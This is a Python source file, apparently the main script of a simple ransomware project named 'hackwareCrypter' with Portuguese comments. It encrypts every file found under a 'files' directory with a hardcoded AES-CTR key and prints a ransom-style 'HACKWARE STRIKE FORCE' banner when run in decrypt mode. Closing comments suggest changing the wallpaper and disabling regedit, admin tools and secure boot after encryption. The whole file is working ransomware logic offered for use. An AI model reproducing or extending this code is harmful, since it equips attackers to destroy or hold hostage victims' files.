#!/usr/bin/python3.6

# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery
import Crypter

HARDCODED_KEY = 'hackware strike force strikes u!'

def get_parser():
    parser = argparse.ArgumentParser(description="hackwareCrypter")
    parser.add_argument(
        '-d,', '--decrypt', help='descripta os arquivos [default: no]', action='store_true')
    return parser

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print(f'''
        HACKWARE STRIKE FORCE
        -------------------------------------------------------
        Seus arquivos foram criptografados;
        Para decripta-los utilize a seguinte senha '{HARDCODED_KEY}'
        ''')

        key = input('Digite a sua senha > ')
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt


    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))

    startDirs = [init_path]

    for currentDir in startDirs:
        for filename in Discovery.discover(currentDir):
            Crypter.change_files(filename, cryptFn)


    # limpa a chave de criptografia da memoria

    for _ in range(100):
        pass

    if not decrypt:
        pass
    # Apos a encriptação você pode alterar o allpaper
    # Alterar os icones, desativar o regedit, admin, bios secure boot etc




if __name__ == '__main__':
    main()